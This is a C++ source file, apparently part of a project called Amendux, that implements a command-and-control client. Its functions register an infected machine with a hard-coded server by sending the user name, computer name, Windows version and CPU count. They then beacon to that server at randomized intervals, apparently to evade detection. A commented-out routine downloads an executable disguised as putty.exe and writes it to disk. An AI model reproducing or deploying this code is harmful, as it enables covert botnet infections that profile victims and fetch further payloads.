#include "stdafx.h"
#include "Log.h"
#include "Encrypt.h"
#include "Config.h"
#include "RestClient.h"
#include "Json.h"
#include "Candcel.h"

using namespace Amendux;

void Candcel::isAlive()
{
	Log::Instance()->write(L"Candcel", L"Check if server is alive");

	RestClient rc("0x17.nl", "avc_endpoint.php");

	rc.Call(RestClientCommand::CM_CLIENT_PING, new JSONValue);

	if (rc.getServerCode() != RestServerCommand::CM_SERVER_PONG) {
		Log::Instance()->write(L"Candcel", "Server did not respond");
	}
}


DWORD Candcel::CheckIn()
{
	if (!serverSolicitAck) {
		return 1;
	}

	while (true) {
		int nextInterval = (rand() % (10 + 1)) + 5;

		Log::Instance()->write(L"Candcel", L"Sending checkin request, then after " + std::to_wstring(nextInterval) + L" minutes");

		RestClient rc("0x17.nl", "avc_endpoint.php");

		JSONObject obj;
		obj[L"guid"] = new JSONValue(Config::Guid());

		rc.Call(RestClientCommand::CM_CLIENT_CHECKIN, new JSONValue(obj));

		if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
			Log::Instance()->write(L"Candcel", "Request failed");
		}

		/* Randomize the interval for obvious reasons */
		Sleep(nextInterval * 60 * 1000);
	}

	return 0;
}


void Candcel::Solicit()
{
	Log::Instance()->write(L"Candcel", L"Notify the server of this instance");

	RestClient rc("0x17.nl", "avc_endpoint.php");

	JSONObject obj;
	obj[L"guid"] = new JSONValue(Config::Guid());
	obj[L"winver"] = new JSONValue(Util::winver());
	obj[L"corenum"] = new JSONValue(std::to_wstring(Util::cpuCores()));
	obj[L"user"] = new JSONValue(Util::user());
	obj[L"computer"] = new JSONValue(Util::machine());

	rc.Call(RestClientCommand::CM_CLIENT_SOLICIT, new JSONValue(obj));

	if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
		Log::Instance()->write(L"Candcel", "Request failed");
	}

	serverSolicitAck = true;
}


void Candcel::Update()
{
	if (!serverSolicitAck) {
		return;
	}

	/*Log::Instance()->write(L"Candcel", L"Sending update request");

	WebClient wc("0x17.nl", "putty.exe");
	char *data = wc.Perform("");

	std::ofstream outfile("putty.exe", std::ofstream::binary);
	outfile.write(data, wc.getResponseSize());
	outfile.close();
	delete data;*/
}
